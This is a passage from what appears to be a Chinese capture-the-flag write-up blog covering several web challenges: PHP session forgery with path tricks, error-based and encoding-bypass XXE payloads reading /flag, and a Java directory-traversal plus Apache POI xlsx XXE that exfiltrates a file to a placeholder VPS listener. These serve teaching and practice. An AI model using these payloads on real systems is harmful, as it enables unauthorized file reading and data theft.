class="number">-65</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile(<span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="variable">$download_result</span> = <span class="string">&quot;downloaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$download_result</span> = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"><span class="comment">//下载操作，获取要读取的文件名(POST filename参数)，拼接路径，判断是否有路径穿越，然后将文件内容返回。</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>思路：伪造 session 使自己变成 admin -&gt; 创建一个 success.txt 文件 -&gt; 读取 flag</p>
<p>我们要伪造admin ，首先需要知道session的处理器</p>
<p>session处理器形式我们可以通过读取session文件来得知，那么我们首先就需要先知道文件名，我们知道session文件命名格式为（<em>sess</em>_[PHPSESSID的值]）,phpsessid可以通过查看cookie知道，所有我们下载文件即可</p>
<blockquote>
<p>POST:   direction=download&amp;attr=&amp;filename=sess_+phpsessid</p>
</blockquote>
<p>得到返回内容</p>
<blockquote>
<p>username:5:”guest”;   (username前面有一个不可见字符)</p>
</blockquote>
<p>可知session处理器为php_binary</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">当 <span class="keyword">session</span>.serialize_handler=php 时，<span class="keyword">session</span>文件内容为： <span class="type">name</span>|s:<span class="number">7</span>:&quot;mochazz&quot;;</span><br><span class="line"></span><br><span class="line">当 <span class="keyword">session</span>.serialize_handler=php_serialize 时，<span class="keyword">session</span>文件为： a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;name&quot;;s:<span class="number">7</span>:&quot;mochazz&quot;;&#125;</span><br><span class="line"></span><br><span class="line">当 <span class="keyword">session</span>.serialize_handler=php_binary 时，<span class="keyword">session</span>文件内容为： 二进制字符names:<span class="number">7</span>:&quot;mochazz&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>本地伪造文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;./&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>将得到的这个文件重命名为sess ,并进行sha256编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> hash_file(<span class="string">&#x27;sha256&#x27;</span>, <span class="string">&#x27;./sess&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</span></span><br></pre></td></tr></table></figure>
<p>而下来要做的就是将这个sess文件上传了，上传点本地构造</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://85daafec-8582-4f39-b121-8ab733bdf710.node3.buuoj.cn/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;up_file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;attr&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;direction&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们可以下载一下这个文件，文件内容确实为我们伪造的damin</p>
<blockquote>
<p>POST:  direction=download&amp;attr=&amp;filename=sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
<p>这里注意要把cookie也改成432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
</blockquote>
<p>第二步就是 secret.txt 文件构造了</p>
<p><strong>对secret.txt 文件的判断是通过file_exists（）函数，</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">说明 ¶</span><br><span class="line">file_exists ( <span class="keyword">string</span> <span class="variable">$filename</span> ) : <span class="keyword">bool</span></span><br><span class="line">检查文件或目录是否存在。</span><br></pre></td></tr></table></figure>
<p><strong>虽然我们不能完全控制上传的文件名，但上传的路径我们是可以控制的，所以我们只需要在 /var/babyctf/ 下创建一个 success.txt 目录即可</strong></p>
<p>分析代码我们知道</p>
<blockquote>
<p> $dir_path = “/var/babyctf/“.$attr;  </p>
</blockquote>
<p>路径会拼接上 attr ,我也我们只需让attr为secret.txt  ,然后在该目录下上传我们之处创建的sess文件，伪造admin即可</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://85daafec-8582-4f39-b121-8ab733bdf710.node3.buuoj.cn/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;up_file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;attr&quot;</span> <span class="attr">value</span>=<span class="string">&quot;success.txt&quot;</span>&gt;</span>   </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;direction&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>获得flag</strong></p>
<p>然后回到刚才的界面内，改下<code>phpsessid</code>为<code>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code>，改<code>attr</code>对应的值为<code>success.txt</code>获得flag</p>
<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p>知识点：XXE攻击</p>
<p><strong>当Web应用采用JSON进行数据传输时,可能存在XXE漏洞。</strong></p>
<p><strong>在该题，我们可以通过使用本地DTD文件来利用XXE漏洞实现任意结果输出</strong></p>
<p><strong>Blind XXE 需要使用到DTD约束自定义实体中的参数实体。参数实体是只能在DTD中定义和使用的实体，以 % 为标志定义，定义和使用方法如下</strong></p>
<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE a[</span></span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!ENTITY b <span class="meta-string">&quot;hello&quot;</span>&gt;</span>  //内部普通实体</span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xml.org/hhh.dtd&quot;</span>&gt;</span> //外部普通实体</span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">para</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///1234.dtd&quot;</span>&gt;</span> //外部参数实体</span></span><br><span class="line"><span class="perl">    %para;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><strong>而且参数实体还能嵌套定义,但需要注意的是,内层的定义的参数实体 % 需要进行HTML转义,否则会出现解析错误</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">para</span> <span class="meta-string">&#x27;&lt;!ENTITY &amp;#x25; files SYSTEM &quot;file:///etc/passwd&quot;&gt;&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>该题我们引用的是linux system 本地的DT文件，路径如下</p>
<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamsa</span> <span class="meta-string">&#x27;Your DTD code&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="perl">%local_dtd;</span></span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">&#x27;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file &amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p><strong>知识点：XXE攻击</strong></p>
<p><strong>有waf ,通过修改编码方式绕过，将utf-8改为utf-16be</strong></p>
<p>放在user或者group标签下最多显示15位字符</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;file:///flag.txt&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后我们看一下User页面，发现其实还存在一个Intro标签,修改payload如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;file:///flag.txt&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">&lt;/users</span><br></pre></td></tr></table></figure>
<blockquote>
<p>cat 1.xml |iconv -f UTF-8 -t UTF-16BE &gt; payload.xml</p>
</blockquote>
<p>将得到的文件上传即可得到flag</p>
<p><strong>当然该题如果不知道 &lt;inctro&gt;时还可以利用报错的方式得到flag</strong></p>
<p>做法类似[GoogleCTF2019 Quals]Bnv</p>
<p>payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">&#x27;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file &amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %ISOamso;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">group</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>




<h2 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2><p>知识点：</p>
<ol>
<li><strong>xlsx打xxe</strong></li>
<li><strong>java审计</strong></li>
<li><strong>目录穿越</strong></li>
</ol>
<p>记录下流程，不知道为什么用的buu内网VPS nc 反弹不上</p>
<p>1.随便上传文件，然后点下载，抓包。看到有filename，猜测可能存在目录穿越以及任意文件下载</p>
<p>2.尝试通过报错来获取网站的绝对路径，设置URL参数 filename=../</p>
<blockquote>
<p>可以看到javaweb的绝对路径爆出来了，由于也是第一次做javaweb的题，这里看了师傅们的wp，发现先去读取配置文件<code>web.xml</code>，看到三个class文件，下载下来，反编译用的 jd-gui</p>
</blockquote>
<blockquote>
<p>什么是web.xml？<br>一般的web工程中都会用到web.xml，web.xml主要用来配置，可以方便的开发web工程。web.xml主要用来配置Filter、Listener、Servlet等。但是要说明的是web.xml并不是必须的，一个web工程可以没有web.xml文件</p>
</blockquote>
<p>3.尝试读取web.xml文件，<a target="_blank" rel="noopener" href="http://40faaff5-177e-4305-a31a-dbfb3de0adb8.node3.buuoj.cn/DownloadServlet?filename=../../../../WEB-INF/web.xml">http://40faaff5-177e-4305-a31a-dbfb3de0adb8.node3.buuoj.cn/DownloadServlet?filename=../../../../WEB-INF/web.xml</a>, 可以看到有三个class文件（因为不知道配置文件的具体位置就用…/来代替具体多少慢慢试）</p>
<p>4.把三个class文件下载下来，tomcat的class文件一般存储在/WEB-INF/classes/下面</p>
<p>filename=…/…/…/…/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class<br>filename=…/…/…/…/WEB-INF/classes/cn/abc/servlet/ListFileServlet.class<br>filename=…/…/…/…/WEB-INF/classes/cn/abc/servlet/ UploadServlet.class</p>
<p>jd-gui反编译</p>
<p>5.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(fileName != <span class="keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">&quot;flag&quot;</span>))</span><br><span class="line">       &#123;</span><br><span class="line">           request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;\u7981\u6B62\u8BFB\u53D6&quot;</span>);</span><br><span class="line">           request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward(request, response);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName))</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">        Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">        System.out.println(sheet.getFirstRowNum());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(InvalidFormatException e)</span><br><span class="line">    &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ol start="6">
<li><p><del>百度搜 java excel 漏洞</del>，<a href="https://xz.aliyun.com/t/6996" target="_blank">Apache-Poi-XXE-Analysis</a></p>
</li>
<li><p>做法如下</p>
<p>新建一个空 excel-xxx.xlsx文件，将后缀改为zip</p>
<p>修改里面的[Content_Types].xml文件，在第二行添加如下代码</p>
<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://VPS的IP/file.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="perl">%remote;%int;%send;</span></span><br><span class="line"><span class="xml">]</span></span><br></pre></td></tr></table></figure>
<p>保存后，重新将后缀改为xlsx</p>
<p>接下去，buu建个小号，在linux-labs开个内网vps，xshell连上，在/var/www/html/目录下创建文件file.dtd，内容</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://VPS的内网IP:9999?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> 开启监听</p>
<blockquote>
<p>nc -lvp 9999</p>
</blockquote>
</li>
</ol>
<p>上传 xlsx 文件，按理说应该被监听到的(f)，不知道为什么，失败了..</p>
<h2 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="[2020 新春红包题]1"></a>[2020 新春红包题]1</h2><p>知识点：</p>
<ol>
<li>死亡exit绕过</li>
<li>php后缀限制绕过</li>
<li>反序列化pop链</li>
</ol>
<p>代码分析就不写了，该题改编自 EIS 2019 的 ezpop</p>
<p>主要记录以下用到的几个知识点和新思路，和原题唯一不同之处就是对文件名做了限制，如下</p>
<p><strong>知识点一：通过 /../ 绕过文件名随机前缀，通过 /. 进行绕过文件名检验</strong></p>
